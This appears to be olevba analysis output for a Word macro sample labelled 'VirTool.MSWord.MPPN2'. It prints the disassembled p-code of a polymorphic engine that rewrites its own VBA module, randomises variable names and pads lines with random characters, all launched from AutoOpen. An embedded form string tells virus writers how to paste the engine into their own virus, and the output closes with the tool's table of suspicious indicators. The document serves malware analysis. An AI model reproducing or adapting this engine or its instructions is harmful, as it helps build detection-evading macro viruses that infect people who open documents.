' 	Ld kewl 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Add 
' 	Ld ActiveDocument 
' 	MemSt Content 
' Line #33:
' 	StartForVariable 
' 	Ld ik 
' 	EndForVariable 
' 	NextVar 
' Line #34:
' 	QuoteRem 0x0000 0x0024 "now find the vars and poymorph 'em !"
' Line #35:
' 	StartForVariable 
' 	Ld ik 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld nr 
' 	For 
' Line #36:
' 	ArgsCall Read 0x0000 
' Line #37:
' 	LitDI2 0x0019 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0019 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0019 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "M1"
' 	Add 
' 	St strip 
' Line #38:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	Set myRange 
' Line #39:
' 	Ld ik 
' 	ArgsLd suk 0x0001 
' 	ParamNamed FindText 
' 	Ld strip 
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld myRange 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0003 
' Line #40:
' 	StartForVariable 
' 	Ld ik 
' 	EndForVariable 
' 	NextVar 
' Line #41:
' 	QuoteRem 0x0000 0x0021 "copy everythig back to its origin"
' Line #42:
' 	Ld kewl 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St nuk 
' Line #43:
' 	LitDI2 0x0001 
' 	Ld nuk 
' 	Ld kewl 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #44:
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	St strip 
' Line #45:
' 	Ld strip 
' 	Ld kewl 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #46:
' 	LitStr 0x0000 ""
' 	Ld ActiveDocument 
' 	MemSt Content 
' Line #47:
' 	Ld bkup 
' 	Ld ActiveDocument 
' 	MemSt Content 
' Line #48:
' 	Label mm 
' Line #49:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld kewl 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	Ne 
' 	IfBlock 
' Line #50:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld kewl 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #51:
' 	GoTo mm 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	QuoteRem 0x0000 0x0010 "Add random chars"
' Line #54:
' 	Ld kewl 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St nr 
' Line #55:
' 	StartForVariable 
' 	Ld ik 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld nr 
' 	For 
' Line #56:
' 	Ld ik 
' 	LitDI2 0x0001 
' 	Ld kewl 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St nam1 
' Line #57:
' 	Ld nam1 
' 	Ld nam1 
' 	FnLen 
' 	ArgsLd Mid$ 0x0002 
' 	St nam2 
' Line #58:
' 	Ld nam2 
' 	LitStr 0x0001 "!"
' 	Ne 
' 	Paren 
' 	Ld nam1 
' 	FnLen 
' 	LitDI2 0x0050 
' 	Lt 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #59:
' 	LitDI2 0x0078 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0078 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0078 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St char1 
' Line #60:
' 	Ld nam1 
' 	LitStr 0x0002 " '"
' 	Add 
' 	Ld char1 
' 	Add 
' 	LitStr 0x0001 "!"
' 	Add 
' 	St strip 
' Line #61:
' 	Ld ik 
' 	Ld strip 
' 	Ld kewl 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	StartForVariable 
' 	Ld ik 
' 	EndForVariable 
' 	NextVar 
' Line #64:
' 	Ld nr 
' 	LitDI2 0x0001 
' 	Ld kewl 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #65:
' 	Ld wdWindowStateMaximize 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Windows 0x0001 
' 	MemSt WindowState 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	EndSub 
' Macros/VBA/Form1 - 2922 bytes
' Line #0:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #1:
' 	LitVarSpecial (True)
' 	Ld Label4 
' 	MemSt Visible 
' Line #2:
' 	EndSub 
' Line #3:
' Line #4:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #5:
' 	Ld Form1 
' 	ArgsMemCall Hide 0x0000 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Form1 
' 	MemSt Enabled 
' Line #7:
' 	EndSub 
' Macros/VBA/Start - 1297 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	LitVarSpecial (True)
' 	Ld Form1 
' 	MemSt Enabled 
' Line #2:
' 	Ld Form1 
' 	ArgsMemCall Show 0x0000 
' Line #3:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.MPPN2' - OLE stream: 'Macros/Form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�MI_pirat 's Polymorphic Engine 2k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.MPPN2' - OLE stream: 'Macros/Form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS�D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.MPPN2' - OLE stream: 'Macros/Form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Help�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.MPPN2' - OLE stream: 'Macros/Form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.MPPN2' - OLE stream: 'Macros/Form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�eXit�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.MPPN2' - OLE stream: 'Macros/Form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.MPPN2' - OLE stream: 'Macros/Form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�How to...�E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.MPPN2' - OLE stream: 'Macros/Form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.MPPN2' - OLE stream: 'Macros/Form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Get outta here!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.MPPN2' - OLE stream: 'Macros/Form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.MPPN2' - OLE stream: 'Macros/Form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�To use the ngine in your virus  just copy the source from the KGB module to your module and give it a 3 letter name.Now, on the 2nd line write: 'XXX (where XXX is the name of your module.Make sure that the 1st line is: Sub AutoOpen() ,else modify the code after mm: with your first line instead of mine.To add your vars then count them and change TRTM1=12+your#.Then add an LUWM1(x)="your-var" for all vars (give the vars long names >4). In Gen0 you have doc. code .Enjoy!!!I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.MPPN2' - OLE stream: 'Macros/Form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.MPPN2' - OLE stream: 'Macros/Form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�e-mail: MI_pirat@yahoo.com
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.MPPN2' - OLE stream: 'Macros/Form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'VirTool.MSWord.MPPN2' - OLE stream: 'Macros/Form1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'VirTool.MSWord.MPPN2' - OLE stream: 'Macros/Form1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'VirTool.MSWord.MPPN2' - OLE stream: 'Macros/Form1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'VirTool.MSWord.MPPN2' - OLE stream: 'Macros/Form1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'VirTool.MSWord.MPPN2' - OLE stream: 'Macros/Form1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'VirTool.MSWord.MPPN2' - OLE stream: 'Macros/Form1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'VirTool.MSWord.MPPN2' - OLE stream: 'Macros/Form1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

